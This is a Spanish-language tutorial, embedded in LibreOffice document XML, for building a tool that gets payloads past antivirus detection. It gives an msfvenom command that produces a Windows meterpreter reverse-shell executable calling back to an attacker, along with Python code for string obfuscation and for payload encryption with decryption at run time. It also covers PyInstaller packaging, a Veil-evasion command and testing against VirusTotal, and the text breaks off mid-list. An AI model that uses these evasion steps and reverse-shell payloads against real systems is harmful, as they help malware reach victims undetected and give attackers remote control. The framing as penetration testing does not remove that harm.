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style:font-name="Arial" fo:font-size="13pt" style:font-size-asian="13pt" style:font-size-complex="13pt"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties style:font-name="Arial" fo:font-size="13pt" style:font-size-asian="13pt" style:font-size-complex="13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text-properties style:font-name="Arial" fo:font-size="13pt" style:font-size-asian="13pt" style:font-size-complex="13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style:font-name="Arial" fo:font-size="13pt" style:font-size-asian="13pt" style:font-size-complex="13pt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>
      <style:text-properties style:font-name="Arial" fo:font-size="13pt" style:font-size-asian="13pt" style:font-size-complex="13pt"/>
    </style:style>
    <style:style style:name="P15" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L8">
      <style:text-properties style:font-name="Arial" fo:font-size="13pt" style:font-size-asian="13pt" style:font-size-complex="13pt"/>
    </style:style>
    <style:style style:name="P16" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L9">
      <style:text-properties style:font-name="Arial" fo:font-size="13pt" style:font-size-asian="13pt" style:font-size-complex="13pt"/>
    </style:style>
    <style:style style:name="P17" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L31">
      <style:text-properties style:font-name="Arial" fo:font-size="13pt" style:font-size-asian="13pt" style:font-size-complex="13pt"/>
    </style:style>
    <style:style style:name="P18" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L55">
      <style:text-properties style:font-name="Arial" fo:font-size="13pt" style:font-size-asian="13pt" style:font-size-complex="13pt"/>
    </style:style>
    <style:style style:name="P19" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L58">
      <style:text-properties style:font-name="Arial" fo:font-size="13pt" style:font-size-asian="13pt" style:font-size-complex="13pt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 style:list-style-name="L38"/>
    <style:style style:name="P48" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L39"/>
    <style:style style:name="P49" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L40"/>
    <style:style style:name="P50" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L41"/>
    <style:style style:name="P51" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L42"/>
    <style:style style:name="P52" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L43"/>
    <style:style style:name="P53" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L44"/>
    <style:style style:name="P54" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L45"/>
    <style:style style:name="P55" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L46"/>
    <style:style style:name="P56" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L47"/>
    <style:style style:name="P57" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L48"/>
    <style:style style:name="P58" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L49"/>
    <style:style style:name="P59" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L50"/>
    <style:style style:name="P60" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L51"/>
    <style:style style:name="P61" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L52"/>
    <style:style style:name="P62" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L53"/>
    <style:style style:name="P63" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L54"/>
    <style:style style:name="P64" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L55"/>
    <style:style style:name="P65" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L56"/>
    <style:style style:name="P66" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L57"/>
    <style:style style:name="P67" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L58"/>
    <style:style style:name="P68" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L59"/>
    <style:style style:name="P69" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L1">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P70" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L2">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P71" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L3">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P72" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L4">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P73" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L5">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P74" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L6">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P75" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L7">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P76" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L9">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P77" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L10">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P78" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L12">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P79" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L14">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P80" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L16">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P81" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L20">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P82" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L9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83" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L3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84" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L4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85" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L25">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P86" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L26">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P87" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L27">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P88" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L28">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P89" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L29">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P90" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L30">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P91" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L31">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P92" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L32">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P93" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L33">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P94" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L34">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P95" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L35">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P96" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L36">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P97" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L37">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P98" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L38">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P99" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L42">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P100" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L43">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P101" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L44">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P102" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L45">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P103" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L46">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P104" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L47">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P105" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L48">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P106" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L49">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P107" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L50">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P108" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L51">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P109" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L57">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P110" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L58">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P111" style:family="paragraph" style:parent-style-name="Horizontal_20_Line">
      <style:text-properties style:font-name="Arial" fo:font-size="13pt" style:font-size-asian="13pt" style:font-size-complex="13pt"/>
    </style:style>
    <style:style style:name="P112" style:family="paragraph" style:parent-style-name="Horizontal_20_Line">
      <style:text-properties style:font-name="Arial" fo:font-size="20pt" style:font-size-asian="20pt" style:font-size-complex="20pt"/>
    </style:style>
    <style:style style:name="P113" style:family="paragraph" style:parent-style-name="Heading_20_3">
      <style:text-properties style:font-name="Arial" fo:font-size="13pt" officeooo:paragraph-rsid="00287522" style:font-size-asian="13pt" style:font-size-complex="13pt"/>
    </style:style>
    <style:style style:name="P114" style:family="paragraph" style:parent-style-name="Preformatted_20_Text" style:list-style-name="L7"/>
    <style:style style:name="P115" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties style:font-name="Arial" fo:font-size="13pt" style:font-size-asian="13pt" style:font-size-complex="13pt"/>
    </style:style>
    <style:style style:name="P116" style:family="paragraph" style:parent-style-name="Preformatted_20_Text" style:list-style-name="L55">
      <style:text-properties style:font-name="Arial" fo:font-size="13pt" style:font-size-asian="13pt" style:font-size-complex="13pt"/>
    </style:style>
    <style:style style:name="P117" style:family="paragraph" style:parent-style-name="Preformatted_20_Text" style:list-style-name="L55"/>
    <style:style style:name="P118" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P119" style:family="paragraph" style:parent-style-name="Preformatted_20_Text" style:list-style-name="L7">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P120" style:family="paragraph" style:parent-style-name="Preformatted_20_Text" style:list-style-name="L8">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P121" style:family="paragraph" style:parent-style-name="Preformatted_20_Text" style:list-style-name="L54">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P122" style:family="paragraph" style:parent-style-name="Preformatted_20_Text" style:list-style-name="L55">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P123" style:family="paragraph" style:parent-style-name="Preformatted_20_Text" style:list-style-name="L56">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P124" style:family="paragraph" style:parent-style-name="Preformatted_20_Text" style:list-style-name="L57">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm" loext:contextual-spacing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Arial"/>
    </style:style>
    <style:style style:name="T7" style:family="text">
      <style:text-properties style:font-name="Arial" fo:font-size="13pt" style:font-size-asian="13pt" style:font-size-complex="13pt"/>
    </style:style>
    <style:style style:name="T8" style:family="text">
      <style:text-properties style:font-name="Arial"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3" text:outline-level="3"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T3">77: Herramienta de Bypass de Antivirus con Técnicas de Ofuscación</text:span></text:span></text:h>
      <text:p text:style-name="Horizontal_20_Line"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T3"/></text:span></text:p>
      <text:h text:style-name="Heading_20_4" text:outline-level="4"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">Objetivo del Proyecto</text:span></text:span><text:span text:style-name="T2">:</text:span></text:h>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T2">El propósito de este proyecto es crear una herramienta que implemente </text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">técnicas de ofuscación</text:span></text:span><text:span text:style-name="T2"> para evadir la detección de un antivirus. Esto se puede lograr mediante la modificación del código del malware o de un payload para ocultar su comportamiento y hacerlo menos detectable por los motores de antivirus. Este proceso de </text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">"bypass"</text:span></text:span><text:span text:style-name="T2"> permitirá realizar pruebas de penetración más efectivas y mejorar la comprensión de cómo los antivirus detectan y bloquean amenazas.</text:span></text:p>
      <text:p text:style-name="P1"/>
      <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">Pasos para Desarrollar la Herramienta</text:span></text:span><text:span text:style-name="T2">:</text:span></text:h>
      <text:h text:style-name="Heading_20_4" text:outline-level="4"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">1. Elección del Payload y Preparación del Entorno</text:span></text:span></text:h>
      <text:list xml:id="list2477549143" text:style-name="L53">
        <text:list-item>
          <text:p text:style-name="P62"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">Selección del Payload</text:span></text:span><text:span text:style-name="T2">: Primero, debes crear o seleccionar un </text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">payload</text:span></text:span><text:span text:style-name="T2"> que se ejecutará en el sistema víctima. Un ejemplo común es un </text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">reverse shell</text:span></text:span><text:span text:style-name="T2">, que se conecta de vuelta a la máquina atacante y permite la ejecución remota de comandos.</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P62"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">Entorno de Pruebas</text:span></text:span><text:span text:style-name="T2">: Usa máquinas virtuales para crear un entorno controlado donde puedas ejecutar las pruebas sin comprometer sistemas de producción. Asegúrate de tener una </text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">máquina víctima</text:span></text:span><text:span text:style-name="T2"> (por ejemplo, una máquina virtual con Windows) y una </text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">máquina atacante</text:span></text:span><text:span text:style-name="T2"> (puede ser Kali Linux o Parrot OS).</text:span></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P1"/>
      <text:h text:style-name="Heading_20_4" text:outline-level="4"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">2. Preparación del Payload</text:span></text:span></text:h>
      <text:list xml:id="list1092527929" text:style-name="L54">
        <text:list-item>
          <text:p text:style-name="P63"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">Uso de Metasploit Framework</text:span></text:span><text:span text:style-name="T2">: Metasploit es una de las herramientas más populares para crear payloads. Un ejemplo básico sería:</text:span></text:p>
          <text:p text:style-name="P121"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP&gt; LPORT=4444 -f exe &gt; payload.exe</text:span></text:span></text:p>
          <text:p text:style-name="P63"><text:span text:style-name="T2">Este comando generará un </text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">payload.exe</text:span></text:span><text:span text:style-name="T2"> que intentará conectarse a la dirección IP de tu máquina atacante y el puerto 4444.</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P63"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">Alternativa</text:span></text:span><text:span text:style-name="T2">: Si prefieres crear tu propio payload desde cero, puedes utilizar Python para crear un </text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">reverse shell</text:span></text:span><text:span text:style-name="T2"> simple, pero en este caso, es </text:span><text:soft-page-break/><text:span text:style-name="T2">recomendable usar herramientas como Metasploit para simplificar el proceso.</text:span></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P1"/>
      <text:h text:style-name="Heading_20_4" text:outline-level="4"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">3. Técnicas de Ofuscación de Código</text:span></text:span></text:h>
      <text:list xml:id="list3075944307" text:style-name="L55">
        <text:list-item>
          <text:p text:style-name="P64"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">Ofuscación de Cadenas de Texto</text:span></text:span><text:span text:style-name="T2">: Los antivirus a menudo detectan malware por las cadenas de texto contenidas en el código, como direcciones IP, nombres de comando o protocolos de red. Debes ocultar estas cadenas utilizando ofuscación.</text:span></text:p>
          <text:p text:style-name="P64"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">Ejemplo de Ofuscación con Python</text:span></text:span><text:span text:style-name="T2">:</text:span></text:p>
          <text:p text:style-name="P117"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">import base64</text:span></text:span></text:p>
          <text:p text:style-name="P116"/>
          <text:p text:style-name="P117"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2"># Cadena a ofuscar</text:span></text:span></text:p>
          <text:p text:style-name="P117"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">original_string = "reverse_tcp"</text:span></text:span></text:p>
          <text:p text:style-name="P117"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">encoded_string = base64.b64encode(original_string.encode('utf-8')).decode('utf-8')</text:span></text:span></text:p>
          <text:p text:style-name="P116"/>
          <text:p text:style-name="P122"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">print(encoded_string) <text:s/># Resultado: "cmV2ZXJzZXRfY3Rw"</text:span></text:span></text:p>
          <text:p text:style-name="P18">Este es solo un ejemplo básico, y en la práctica se pueden usar técnicas más complejas para ocultar las cadenas.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P64"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">Polimorfismo del Payload</text:span></text:span><text:span text:style-name="T2">: Cada vez que se genera un nuevo payload, debe ser diferente al anterior para evitar que el antivirus lo reconozca por su firma. Esto se logra mediante </text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">técnicas de polimorfismo</text:span></text:span><text:span text:style-name="T2">, que alteran ligeramente el código cada vez que se genera.</text:span></text:p>
          <text:p text:style-name="P18">Una forma de lograrlo es modificar dinámicamente el código que se ejecutará, cambiando la estructura del código pero manteniendo el comportamiento funcional.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P64"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">Uso de Cifrado/Decodificación Dinámica</text:span></text:span><text:span text:style-name="T2">: Para asegurar que el código malicioso no sea fácilmente detectado, puedes cifrar el payload y luego descifrarlo en memoria durante la ejecución.</text:span></text:p>
          <text:p text:style-name="P64"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">Ejemplo de cifrado de un payload en Python</text:span></text:span><text:span text:style-name="T2">:</text:span></text:p>
          <text:p text:style-name="P117"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">from cryptography.fernet import Fernet</text:span></text:span></text:p>
          <text:p text:style-name="P116"/>
          <text:p text:style-name="P117"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2"># Generación de la clave</text:span></text:span></text:p>
          <text:p text:style-name="P117"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">key = Fernet.generate_key()</text:span></text:span></text:p>
          <text:p text:style-name="P117"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">cipher_suite = Fernet(key)</text:span></text:span></text:p>
          <text:p text:style-name="P116"/>
          <text:p text:style-name="P117"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2"># Cifrado del payload</text:span></text:span></text:p>
          <text:p text:style-name="P117"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">cipher_text = cipher_suite.encrypt(b"reverse_shell_payload")</text:span></text:span></text:p>
          <text:p text:style-name="P117"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">print(f"Payload Cifrado: {cipher_text}")</text:span></text:span></text:p>
          <text:p text:style-name="P116"><text:soft-page-break/></text:p>
          <text:p text:style-name="P117"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2"># Descifrado dinámico en tiempo de ejecución</text:span></text:span></text:p>
          <text:p text:style-name="P117"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">decrypted_payload = cipher_suite.decrypt(cipher_text)</text:span></text:span></text:p>
          <text:p text:style-name="P122"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">print(f"Payload Descifrado: {decrypted_payload}")</text:span></text:span></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P1"/>
      <text:h text:style-name="Heading_20_4" text:outline-level="4"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">4. Ofuscación de Binarios y Ejecución</text:span></text:span></text:h>
      <text:list xml:id="list625085635" text:style-name="L56">
        <text:list-item>
          <text:p text:style-name="P65"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">Compilación y Ofuscación con PyInstaller</text:span></text:span><text:span text:style-name="T2">: Una vez que el código Python esté listo, puedes usar </text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">PyInstaller</text:span></text:span><text:span text:style-name="T2"> para compilar el código en un archivo ejecutable (EXE). PyInstaller también permite aplicar ofuscación mínima al binario compilado.</text:span></text:p>
          <text:p text:style-name="P123"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">pyinstaller --onefile --clean --distpath dist payload.py</text:span></text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P65"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">Ofuscación del Binario con Herramientas Adicionales</text:span></text:span><text:span text:style-name="T2">: Después de generar el binario EXE, puedes usar herramientas como </text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">CFF Explorer</text:span></text:span><text:span text:style-name="T2"> para modificar el binario y agregar más capas de ofuscación. Esto puede incluir cambios en la cabecera del archivo, cambios en los datos incrustados, y el uso de técnicas de codificación para ocultar el código real del payload.</text:span></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P1"/>
      <text:h text:style-name="Heading_20_4" text:outline-level="4"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">5. Bypass de Antivirus</text:span></text:span></text:h>
      <text:list xml:id="list2573958853" text:style-name="L57">
        <text:list-item>
          <text:p text:style-name="P66"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">Evitar la Detección por Firmas</text:span></text:span><text:span text:style-name="T2">: El principal mecanismo de detección de los antivirus es la firma. Si el código tiene un patrón conocido, el antivirus lo detectará. Debes modificar las cadenas y estructuras del código de manera que no coincidan con las firmas conocidas. Algunas técnicas incluyen:</text:span></text:p>
          <text:list>
            <text:list-item>
              <text:p text:style-name="P109"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">Modificación del Código Binario</text:span></text:span><text:span text:style-name="T2">: Alterando los valores de las direcciones y las cadenas. </text:span></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P109"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">Uso de Técnicas de Encriptación</text:span></text:span><text:span text:style-name="T2">: Para que el payload esté encriptado y el antivirus no lo detecte como malicioso. </text:span></text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P66"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">Uso de Frameworks como Veil</text:span></text:span><text:span text:style-name="T2">: Puedes usar </text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">Veil</text:span></text:span><text:span text:style-name="T2"> para crear </text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">payloads ofuscados</text:span></text:span><text:span text:style-name="T2">. Veil está diseñado específicamente para evitar que los antivirus detecten los payloads y es ampliamente utilizado en pruebas de penetración.</text:span></text:p>
          <text:p text:style-name="P124"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">veil-evasion -p python/meterpreter_reverse_tcp</text:span></text:span></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P1"/>
      <text:h text:style-name="Heading_20_4" text:outline-level="4"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">6. Análisis de Detección y Mejora</text:span></text:span></text:h>
      <text:list xml:id="list1721621461" text:style-name="L58">
        <text:list-item>
          <text:p text:style-name="P67"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">Pruebas Contra Antivirus</text:span></text:span><text:span text:style-name="T2">: Una vez que hayas creado tu payload ofuscado, debes probarlo contra varios antivirus. Puedes usar </text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">VirusTotal</text:span></text:span><text:span text:style-name="T2"> para verificar si tu archivo es detectado por los motores de antivirus más comunes.</text:span></text:p>
          <text:list>
            <text:list-item>
              <text:p text:style-name="P110"><text:soft-page-break/><text:span text:style-name="T2">Sube tu archivo a </text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">VirusTotal</text:span></text:span><text:span text:style-name="T2"> y observa si es detectado por alguno de los antivirus. </text:span></text:p>
            </text:list-item>
            <text:list-item>
